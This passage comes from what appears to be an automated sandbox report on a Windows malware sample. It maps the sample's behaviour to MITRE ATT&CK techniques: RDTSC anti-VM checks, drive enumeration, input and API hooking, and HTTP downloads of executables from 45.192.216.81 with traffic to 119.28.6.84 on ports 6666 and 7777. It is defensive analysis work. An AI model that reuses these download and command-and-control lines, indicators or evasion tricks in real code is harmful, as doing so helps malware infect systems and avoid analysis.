0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: DB727E instructions rdtsc caused by: RDTSC with Trap Flag (TF)", "HideFromDebugger", "DebugPort", "DebugObjectHandle"]}]}, {"id": "T1057", "name": "Process Discovery", "link": "https://attack.mitre.org/techniques/T1057/", "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc. ESXi also supports use of the ps command, as well as esxcli system process list.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.", "signatures": [{"severity": "INFO", "description": "May try to detect the Windows Explorer process (often used for injection)", "match_data": ["inProgram Manager", "ProcessInformation"]}, {"severity": "INFO", "description": "Queries a list of all running processes", "match_data": ["inProgram Manager", "ProcessInformation"]}]}, {"id": "T1010", "name": "Application Window Discovery", "link": "https://attack.mitre.org/techniques/T1010/", "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.", "signatures": [{"severity": "INFO", "description": "Sample monitors Window changes (e.g. starting applications), analyze the sample with the simulation cookbook"}]}, {"id": "T1120", "name": "Peripheral Device Discovery", "link": "https://attack.mitre.org/techniques/T1120/", "description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.", "signatures": [{"severity": "INFO", "description": "Checks for available system drives (often done to infect USB drives)", "match_data": ["z:", "x:", "v:", "t:", "r:", "p:", "n:", "l:", "j:", "h:", "f:", "d:", "b:", "y:", "w:", "u:", "s:", "q:", "o:", "m:", "k:", "i:", "g:", "e:", "c:", "[:"]}, {"severity": "INFO", "description": "Sample is looking for USB drives. Launch the sample with the USB Fake Disk cookbook", "match_data": ["z:", "x:", "v:", "t:", "r:", "p:", "n:", "l:", "j:", "h:", "f:", "d:", "b:", "y:", "w:", "u:", "s:", "q:", "o:", "m:", "k:", "i:", "g:", "e:", "c:", "[:"]}]}, {"id": "T1083", "name": "File and Directory Discovery", "link": "https://attack.mitre.org/techniques/T1083/", "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).\nSome files and directories may require elevated or specific user permissions to access.", "signatures": [{"severity": "INFO", "description": "Reads ini files", "match_data": ["C:\\Users\\user\\Desktop\\desktop.ini", "C:\\Users\\user\\AppData", "C:\\Users\\user", "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\desktop.ini", "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Internet Explorer", "C:\\Users\\user\\AppData\\Roaming", "C:\\Users\\user\\AppData\\Roaming\\Microsoft"]}, {"severity": "INFO", "description": "Enumerates the file system", "match_data": ["C:\\Users\\user\\Desktop\\desktop.ini", "C:\\Users\\user\\AppData", "C:\\Users\\user", "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\desktop.ini", "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Internet Explorer", "C:\\Users\\user\\AppData\\Roaming", "C:\\Users\\user\\AppData\\Roaming\\Microsoft"]}]}, {"id": "T1082", "name": "System Information Discovery", "link": "https://attack.mitre.org/techniques/T1082/", "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). On ESXi servers, threat actors may gather system information from various esxcli utilities, such as system hostname get, system version get, and storage filesystem list (to list storage volumes).\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.\nSystem Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment. ", "signatures": [{"severity": "INFO", "description": "Checks the free space of harddrives", "match_data": ["C:\\ FullSizeInformation", "First address: DA3D36 second address: DA3D45 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: A2FEF9 second address: A2FF02 instructions: 0x00000000 rdtsc 0x00000002 setns bl 0x00000005 shl edx, FFFFFFCAh 0x00000008 pop esi 0x00000009 rdtsc ", "First address: AA8AC5 second address: AA8AD4 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: DB727E instructions rdtsc caused by: RDTSC with Trap Flag (TF)", "C:\\ VolumeInformation", "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers"]}, {"severity": "LOW", "description": "Tries to detect virtualization through RDTSC time measurements", "match_data": ["C:\\ FullSizeInformation", "First address: DA3D36 second address: DA3D45 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: A2FEF9 second address: A2FF02 instructions: 0x00000000 rdtsc 0x00000002 setns bl 0x00000005 shl edx, FFFFFFCAh 0x00000008 pop esi 0x00000009 rdtsc ", "First address: AA8AC5 second address: AA8AD4 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: DB727E instructions rdtsc caused by: RDTSC with Trap Flag (TF)", "C:\\ VolumeInformation", "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers"]}, {"severity": "LOW", "description": "Tries to evade analysis by execution special instruction (VM detection)", "match_data": ["C:\\ FullSizeInformation", "First address: DA3D36 second address: DA3D45 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: A2FEF9 second address: A2FF02 instructions: 0x00000000 rdtsc 0x00000002 setns bl 0x00000005 shl edx, FFFFFFCAh 0x00000008 pop esi 0x00000009 rdtsc ", "First address: AA8AC5 second address: AA8AD4 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: DB727E instructions rdtsc caused by: RDTSC with Trap Flag (TF)", "C:\\ VolumeInformation", "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers"]}, {"severity": "INFO", "description": "Queries the volume information (name, serial number etc) of a device", "match_data": ["C:\\ FullSizeInformation", "First address: DA3D36 second address: DA3D45 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: A2FEF9 second address: A2FF02 instructions: 0x00000000 rdtsc 0x00000002 setns bl 0x00000005 shl edx, FFFFFFCAh 0x00000008 pop esi 0x00000009 rdtsc ", "First address: AA8AC5 second address: AA8AD4 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: DB727E instructions rdtsc caused by: RDTSC with Trap Flag (TF)", "C:\\ VolumeInformation", "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers"]}, {"severity": "INFO", "description": "Reads software policies", "match_data": ["C:\\ FullSizeInformation", "First address: DA3D36 second address: DA3D45 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: A2FEF9 second address: A2FF02 instructions: 0x00000000 rdtsc 0x00000002 setns bl 0x00000005 shl edx, FFFFFFCAh 0x00000008 pop esi 0x00000009 rdtsc ", "First address: AA8AC5 second address: AA8AD4 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: DB727E instructions rdtsc caused by: RDTSC with Trap Flag (TF)", "C:\\ VolumeInformation", "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers"]}]}]}, {"id": "TA0006", "name": "Credential Access", "link": "https://attack.mitre.org/tactics/TA0006/", "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.", "techniques": [{"id": "T1056", "name": "Input Capture", "link": "https://attack.mitre.org/techniques/T1056/", "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).", "signatures": [{"severity": "INFO", "description": "Creates a DirectInput object (often for capturing keystrokes)", "match_data": ["DirectInput8Create", "0 mouse low level C:\\Windows\\SYSTEM32\\DINPUT8.dll"]}, {"severity": "INFO", "description": "Installs a global mouse hook", "match_data": ["DirectInput8Create", "0 mouse low level C:\\Windows\\SYSTEM32\\DINPUT8.dll"]}]}, {"id": "T1056.004", "name": "Credential API Hooking", "link": "https://attack.mitre.org/techniques/T1056/004/", "description": "Adversaries may hook into Windows application programming interface (API) functions and Linux system functions to collect user credentials. Malicious hooking mechanisms may capture API or function calls that include parameters that reveal user authentication credentials. Unlike Keylogging, this technique focuses specifically on API functions that include parameters that reveal user credentials. \nIn Windows, hooking involves redirecting calls to these functions and can be implemented via:\n\nHooks procedures, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.\nImport address table (IAT) hooking, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.\nInline hooking, which overwrites the first bytes in an API function to redirect code flow.\n\nIn Linux and macOS, adversaries may hook into system functions via the LD_PRELOAD (Linux) or DYLD_INSERT_LIBRARIES (macOS) environment variables, which enables loading shared libraries into a program\u2019s address space. For example, an adversary may capture credentials by hooking into the libc read function leveraged by SSH or SCP.", "signatures": [{"severity": "LOW", "description": "Overwrites code with unconditional jumps - possibly settings hooks in foreign process", "match_data": ["PID: 6544 base: 1160005 value: E9 0B 6C C7 76 ", "PID: 6544 base: 77DD6C10 value: E9 FA 93 38 89 ", "PID: 6544 base: 1170007 value: E9 9B 41 CA 76 ", "PID: 6544 base: 77E141A0 value: E9 6E BE 35 89 ", "PID: 6544 base: 12E0005 value: E9 0B 44 AD 76 ", "PID: 6544 base: 77DB4410 value: E9 FA BB 52 89 ", "PID: 6544 base: 1300008 value: E9 6B 95 AF 76 ", "PID: 6544 base: 77DF9570 value: E9 A0 6A 50 89 ", "PID: 6544 base: 1310005 value: E9 1B 15 74 76 ", "PID: 6544 base: 77A51520 value: E9 EA EA 8B 89 ", "PID: 6544 base: 1320005 value: E9 2B 13 71 76 ", "PID: 6544 base: 77A31330 value: E9 DA EC 8E 89 ", "PID: 6544 base: 2DD0005 value: E9 DB 12 A5 74 ", "PID: 6544 base: 778212E0 value: E9 2A ED 5A 8B ", "PID: 6544 base: 2DE0005 value: E9 4B 13 A4 74 ", "PID: 6544 base: 77821350 value: E9 BA EC 5B 8B "]}]}]}, {"id": "TA0009", "name": "Collection", "link": "https://attack.mitre.org/tactics/TA0009/", "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to either steal (exfiltrate) the data or to use the data to gain more information about the target environment. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.", "techniques": [{"id": "T1056", "name": "Input Capture", "link": "https://attack.mitre.org/techniques/T1056/", "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).", "signatures": [{"severity": "INFO", "description": "Creates a DirectInput object (often for capturing keystrokes)", "match_data": ["DirectInput8Create", "0 mouse low level C:\\Windows\\SYSTEM32\\DINPUT8.dll"]}, {"severity": "INFO", "description": "Installs a global mouse hook", "match_data": ["DirectInput8Create", "0 mouse low level C:\\Windows\\SYSTEM32\\DINPUT8.dll"]}]}, {"id": "T1056.004", "name": "Credential API Hooking", "link": "https://attack.mitre.org/techniques/T1056/004/", "description": "Adversaries may hook into Windows application programming interface (API) functions and Linux system functions to collect user credentials. Malicious hooking mechanisms may capture API or function calls that include parameters that reveal user authentication credentials. Unlike Keylogging, this technique focuses specifically on API functions that include parameters that reveal user credentials. \nIn Windows, hooking involves redirecting calls to these functions and can be implemented via:\n\nHooks procedures, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.\nImport address table (IAT) hooking, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.\nInline hooking, which overwrites the first bytes in an API function to redirect code flow.\n\nIn Linux and macOS, adversaries may hook into system functions via the LD_PRELOAD (Linux) or DYLD_INSERT_LIBRARIES (macOS) environment variables, which enables loading shared libraries into a program\u2019s address space. For example, an adversary may capture credentials by hooking into the libc read function leveraged by SSH or SCP.", "signatures": [{"severity": "LOW", "description": "Overwrites code with unconditional jumps - possibly settings hooks in foreign process", "match_data": ["PID: 6544 base: 1160005 value: E9 0B 6C C7 76 ", "PID: 6544 base: 77DD6C10 value: E9 FA 93 38 89 ", "PID: 6544 base: 1170007 value: E9 9B 41 CA 76 ", "PID: 6544 base: 77E141A0 value: E9 6E BE 35 89 ", "PID: 6544 base: 12E0005 value: E9 0B 44 AD 76 ", "PID: 6544 base: 77DB4410 value: E9 FA BB 52 89 ", "PID: 6544 base: 1300008 value: E9 6B 95 AF 76 ", "PID: 6544 base: 77DF9570 value: E9 A0 6A 50 89 ", "PID: 6544 base: 1310005 value: E9 1B 15 74 76 ", "PID: 6544 base: 77A51520 value: E9 EA EA 8B 89 ", "PID: 6544 base: 1320005 value: E9 2B 13 71 76 ", "PID: 6544 base: 77A31330 value: E9 DA EC 8E 89 ", "PID: 6544 base: 2DD0005 value: E9 DB 12 A5 74 ", "PID: 6544 base: 778212E0 value: E9 2A ED 5A 8B ", "PID: 6544 base: 2DE0005 value: E9 4B 13 A4 74 ", "PID: 6544 base: 77821350 value: E9 BA EC 5B 8B "]}]}]}, {"id": "TA0011", "name": "Command and Control", "link": "https://attack.mitre.org/tactics/TA0011/", "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim\u2019s network structure and defenses.", "techniques": [{"id": "T1571", "name": "Non-Standard Port", "link": "https://attack.mitre.org/techniques/T1571/", "description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.", "signatures": [{"severity": "INFO", "description": "Detected TCP or UDP traffic on non-standard ports", "match_data": ["192.168.122.101:49724 -> 119.28.6.84:6666"]}]}, {"id": "T1105", "name": "Ingress Tool Transfer", "link": "https://attack.mitre.org/techniques/T1105/", "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \nOn Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.  A number of these tools, such as wget, curl, and scp, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via certutil -hashfile).\nAdversaries may also abuse installers and package managers, such as yum or winget, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows search-ms protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.", "signatures": [{"severity": "INFO", "description": "Downloads files from webservers via HTTP", "match_data": ["GET /witheFile.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /06/login.bin HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Windows_system_deponcom.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /dll/libcef.dll HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Te.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:41 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Sun, 06 Apr 2025 08:05:57 GMTETag: \"c8a8-6321796e69ec9", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:43 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Mon, 25 Jun 2018 03:07:32 GMTETag: \"a9bd8-56f6eaeb9050", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:44 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Thu, 01 May 2025 22:18:16 GMTETag: \"11600-6341a69143f2", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:45 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Thu, 08 May 2025 22:55:41 GMTETag: \"dad8-634a7bfc1f4d3"]}, {"severity": "INFO", "description": "Downloads executable code via HTTP", "match_data": ["GET /witheFile.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /06/login.bin HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Windows_system_deponcom.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /dll/libcef.dll HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Te.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:41 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Sun, 06 Apr 2025 08:05:57 GMTETag: \"c8a8-6321796e69ec9", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:43 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Mon, 25 Jun 2018 03:07:32 GMTETag: \"a9bd8-56f6eaeb9050", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:44 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Thu, 01 May 2025 22:18:16 GMTETag: \"11600-6341a69143f2", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:45 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Thu, 08 May 2025 22:55:41 GMTETag: \"dad8-634a7bfc1f4d3"]}]}, {"id": "T1095", "name": "Non-Application Layer Protocol", "link": "https://attack.mitre.org/techniques/T1095/", "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.\nIn ESXi environments, adversaries may leverage the Virtual Machine Communication Interface (VMCI) for communication between guest virtual machines and the ESXi host. This traffic is similar to client-server communications on traditional network sockets but is localized to the physical machine running the ESXi host, meaning it does not traverse external networks (routers, switches). This results in communications that are invisible to external monitoring and standard networking tools like tcpdump, netstat, nmap, and Wireshark. By adding a VMCI backdoor to a compromised ESXi host, adversaries may persistently regain access from any guest VM to the compromised ESXi host\u2019s backdoor, regardless of network segmentation or firewall rules in place.", "signatures": [{"severity": "INFO", "description": "Downloads files from webservers via HTTP", "match_data": ["GET /witheFile.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /06/login.bin HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Windows_system_deponcom.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /dll/libcef.dll HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Te.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache"]}]}, {"id": "T1071", "name": "Application Layer Protocol", "link": "https://attack.mitre.org/techniques/T1071/", "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ", "signatures": [{"severity": "INFO", "description": "Uses a known web browser user agent for HTTP communication", "match_data": ["GET /witheFile.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /06/login.bin HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Windows_system_deponcom.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /dll/libcef.dll HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Te.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /witheFile.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /06/login.bin HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Windows_system_deponcom.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /dll/libcef.dll HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Te.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:41 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Sun, 06 Apr 2025 08:05:57 GMTETag: \"c8a8-6321796e69ec9", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:43 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Mon, 25 Jun 2018 03:07:32 GMTETag: \"a9bd8-56f6eaeb9050", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:44 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Thu, 01 May 2025 22:18:16 GMTETag: \"11600-6341a69143f2", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:45 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Thu, 08 May 2025 22:55:41 GMTETag: \"dad8-634a7bfc1f4d3", "119.28.6.84:6666", "119.28.6.84:7777"]}, {"severity": "INFO", "description": "Downloads files from webservers via HTTP", "match_data": ["GET /witheFile.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /06/login.bin HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Windows_system_deponcom.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /dll/libcef.dll HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Te.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /witheFile.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; 